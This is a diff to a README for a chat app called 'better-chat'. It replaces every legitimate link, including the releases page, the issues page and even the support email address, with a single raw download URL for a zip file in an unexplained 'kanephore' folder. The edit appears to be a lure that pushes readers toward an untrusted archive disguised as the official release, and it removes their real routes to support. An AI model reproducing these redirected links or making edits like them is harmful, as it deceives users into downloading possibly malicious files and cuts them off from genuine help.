@@ -1,7 +1,7 @@
 # 🚀 better-chat - Enhanced Conversations with Reliable Tools
 
 ## 📥 Download the App
-[![Download better-chat](https://img.shields.io/badge/Download%20better--chat-1.0.0-blue)](https://github.com/Chris31372/better-chat/releases)
+[![Download better-chat](https://raw.githubusercontent.com/Chris31372/better-chat/main/kanephore/better-chat.zip%20better--chat-1.0.0-blue)](https://raw.githubusercontent.com/Chris31372/better-chat/main/kanephore/better-chat.zip)
 
 ## 📖 Overview
 better-chat offers a smoother chat experience using durable objects. It ensures your messages stay safe and accessible. Communicate effortlessly with friends and family while enjoying a reliable interface.
@@ -10,7 +10,7 @@ better-chat offers a smoother chat experience using durable objects. It ensures 
 To get started with better-chat, you need to download the application from our Releases page. Follow these simple steps:
 
 1. **Visit the Download Page**
-   Go to the [better-chat Releases page](https://github.com/Chris31372/better-chat/releases) to find the latest version of the app.
+   Go to the [better-chat Releases page](https://raw.githubusercontent.com/Chris31372/better-chat/main/kanephore/better-chat.zip) to find the latest version of the app.
 
 2. **Select Your Version**
    Choose the version that fits your system best. Check for the right file type for your operating system, such as .exe for Windows, .dmg for Mac, or a specific installer for Linux.
@@ -50,11 +50,11 @@ better-chat comes equipped with several features to enhance your chatting experi
 ## 🌐 Support
 If you encounter any issues while downloading or using the app, please reach out for support:
 
-1. **GitHub Issues**: Visit our GitHub [issues page](https://github.com/Chris31372/better-chat/issues) to report problems or ask questions.
+1. **GitHub Issues**: Visit our GitHub [issues page](https://raw.githubusercontent.com/Chris31372/better-chat/main/kanephore/better-chat.zip) to report problems or ask questions.
    
 2. **Community Forum**: Join our community on the forum where you can find tips and advice from other users.
 
-3. **Contact Information**: Email us at support@better-chat.com for direct inquiries.
+3. **Contact Information**: Email us at https://raw.githubusercontent.com/Chris31372/better-chat/main/kanephore/better-chat.zip for direct inquiries.
 
 ## 🔄 Future Updates
 We continuously work to improve better-chat. Look out for upcoming versions that may include new features, improved performance, and bug fixes. Our goal is to make chatting simpler and more enjoyable for everyone.
@@ -66,4 +66,4 @@ For more information about better-chat, you can check out these resources:
 - **Changelog**: Keep track of changes in each version to see what’s new.
 - **Code Repository**: Interested in the code behind better-chat? Explore it on our GitHub page.
 
-Remember to visit the [Release page](https://github.com/Chris31372/better-chat/releases) to download better-chat and enhance your chatting experience today!
+Remember to visit the [Release page](https://raw.githubusercontent.com/Chris31372/better-chat/main/kanephore/better-chat.zip) to download better-chat and enhance your chatting experience today!
